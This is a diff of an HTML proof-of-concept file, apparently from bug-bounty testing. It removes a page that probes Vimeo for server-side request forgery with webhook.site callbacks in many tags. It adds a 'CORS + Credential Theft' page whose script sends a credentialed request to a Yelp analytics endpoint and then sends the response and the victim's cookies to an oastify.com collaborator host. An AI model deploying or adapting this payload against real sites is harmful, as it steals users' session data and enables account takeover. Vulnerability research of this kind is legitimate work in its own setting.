@@ -1,50 +1,21 @@
-<!DOCTYPE html>
 <html>
-<head>
-<title>Vimeo SSRF Test</title>
-<style>
-/* CSS background request */
-body {
-    background: url('https://webhook.site/7555a2ac-0fed-40dc-85c0-92c6a867ac65?css=bg');
-}
-</style>
-</head>
-<body>
-<h1>Vimeo SSRF Test Page</h1>
-<p>If Vimeo is fetching this HTML server-side, you’ll see hits on your Webhook.site log.</p>
-
-<!-- Image load -->
-<img src="https://webhook.site/7555a2ac-0fed-40dc-85c0-92c6a867ac65?img=1">
-
-<!-- Iframe -->
-<iframe src="https://webhook.site/7555a2ac-0fed-40dc-85c0-92c6a867ac65?iframe=1" width="0" height="0"></iframe>
-
-<!-- JavaScript fetch -->
-<script>
-fetch("https://webhook.site/7555a2ac-0fed-40dc-85c0-92c6a867ac65?jsfetch=1");
-
-// JS image
-new Image().src = "https://webhook.site/7555a2ac-0fed-40dc-85c0-92c6a867ac65?jsimg=1";
-
-// Script tag load
-var s = document.createElement('script');
-s.src = "https://webhook.site/7555a2ac-0fed-40dc-85c0-92c6a867ac65?script=1";
-document.body.appendChild(s);
-</script>
-
-<!-- CSS external -->
-<link rel="stylesheet" href="https://webhook.site/7555a2ac-0fed-40dc-85c0-92c6a867ac65?csslink=1">
-
-<!-- Video -->
-<video controls autoplay>
-    <source src="https://webhook.site/7555a2ac-0fed-40dc-85c0-92c6a867ac65?video=1" type="video/mp4">
-</video>
-
-<!-- Object -->
-<object data="https://webhook.site/7555a2ac-0fed-40dc-85c0-92c6a867ac65?object=1"></object>
-
-<!-- Embed -->
-<embed src="https://webhook.site/7555a2ac-0fed-40dc-85c0-92c6a867ac65?embed=1">
-
-</body>
+  <body>
+    <h1>POC: CORS + Credential Theft</h1>
+    <script>
+      fetch("https://sp.yelp.com/com.snowplowanalytics.snowplow/tp2", {
+        method: "POST",
+        credentials: "include", // send victim's cookies
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          schema: "iglu:com.snowplowanalytics.snowplow/atomic/jsonschema/1-0-0",
+          data: [{ e: "pv", url: "https://evil.com/cors-poc" }]
+        })
+      })
+      .then(r => r.text())
+      .then(d => {
+        // Exfiltrate response + cookies to attacker server
+        fetch("https://your-collab-id.oastify.com/log?resp=" + btoa(d) + "&c=" + document.cookie);
+      });
+    </script>
+  </body>
 </html>
